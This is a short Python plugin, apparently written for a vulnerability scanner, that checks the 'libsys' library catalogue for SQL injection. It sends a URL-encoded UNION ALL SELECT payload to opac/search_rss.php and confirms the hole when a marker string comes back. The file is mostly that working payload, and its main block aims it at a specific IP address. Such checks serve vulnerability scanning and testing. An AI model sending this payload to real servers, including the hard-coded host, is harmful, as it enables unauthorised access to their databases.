#!/usr/bin/python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'


def assign(service, arg):
    if service == "libsys":
        return True, arg


def audit(arg):
    payload = 'opac/search_rss.php?location=ALL%27%20UNION%20ALL%20SELECT%20CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28100%29%7C%7CCHR%28108%29%7C%7CCHR%2898%29%7C%7CCHR%28104%29%7C%7CCHR%28120%29%7C%7CCHR%2871%29%7C%7CCHR%28112%29%7C%7CCHR%28105%29%7C%7CCHR%28108%29%7C%7CCHR%2881%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20DUAL--%20&title=ccc&doctype=ALL&lang_code=ALL&match_flag=forward&displaypg=20&showmode=list&orderby=DESC&sort=CATA_DATE&onlylendable=yes&with_ebook=&with_ebook='
    url = arg + payload
    code, head,res, errcode, _ = curl.curl2(url)
    if code == 200 and 'qvpzqdlbhxGpilQqzxqq' in res:
        security_hole(url)
                        
if __name__ == '__main__':
    from dummy import *
    audit(assign('libsys', 'http://202.114.181.3:8080/')[1])